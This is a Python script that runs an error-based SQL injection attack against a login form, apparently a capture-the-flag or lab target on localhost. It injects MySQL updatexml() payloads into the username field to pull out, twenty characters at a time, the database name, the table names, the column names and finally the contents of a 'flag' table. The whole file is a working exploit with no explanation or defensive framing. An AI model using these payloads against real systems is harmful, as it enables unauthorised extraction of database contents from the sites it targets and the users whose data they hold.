import requests
import re

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62'}
url = "http://127.0.0.1/error.php"
rule = r"'~(.+?)~'"


def get_database_name():
    database_name = ''
    for i in range(1, 100, 20):
        payload = {"username": "' and updatexml(1,concat(0x7e,(select substr(database(),%d,20)),0x7e),1)#" % i, "password": "123", "submit": "登录"}
        r = requests.post(url=url, data=payload)
        tmp = re.findall(rule, r.text)
        if tmp:
            database_name += tmp[0]
            print(database_name)
        else:
            return


def get_table_name():
    table_name = ''
    for i in range(1, 100, 20):
        payload = {"username": "' and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),%d,20) from information_schema.tables where table_schema=database()),0x7e),1)#" % i, "password": "123", "submit": "登录"}
        r = requests.post(url=url, data=payload)
        tmp = re.findall(rule, r.text)
        if tmp:
            table_name += tmp[0]
            print(table_name)
        else:
            return


def get_column_name():
    column_name = ''
    for i in range(1, 100, 20):
        payload = {"username": "' and updatexml(1,concat(0x7e,(select substr(group_concat(column_name),%d,20) from information_schema.columns where table_name='flag' and table_schema=database()),0x7e),1)#" % i, "password": "123", "submit": "登录"}
        r = requests.post(url=url, data=payload)
        tmp = re.findall(rule, r.text)
        if tmp:
            column_name += tmp[0]
            print(column_name)
        else:
            return


def get_flag():
    flag = ''
    for i in range(1, 100, 20):
        payload = {"username": "' and updatexml(1,concat(0x7e,(select substr(group_concat(flag),%d,20) from flag),0x7e),1)#" % i, "password": "123", "submit": "登录"}
        r = requests.post(url=url, data=payload)
        tmp = re.findall(rule, r.text)
        if tmp:
            flag += tmp[0]
            print(flag)
        else:
            return


if __name__ == '__main__':
    get_database_name()
    get_table_name()
    get_column_name()
    get_flag()
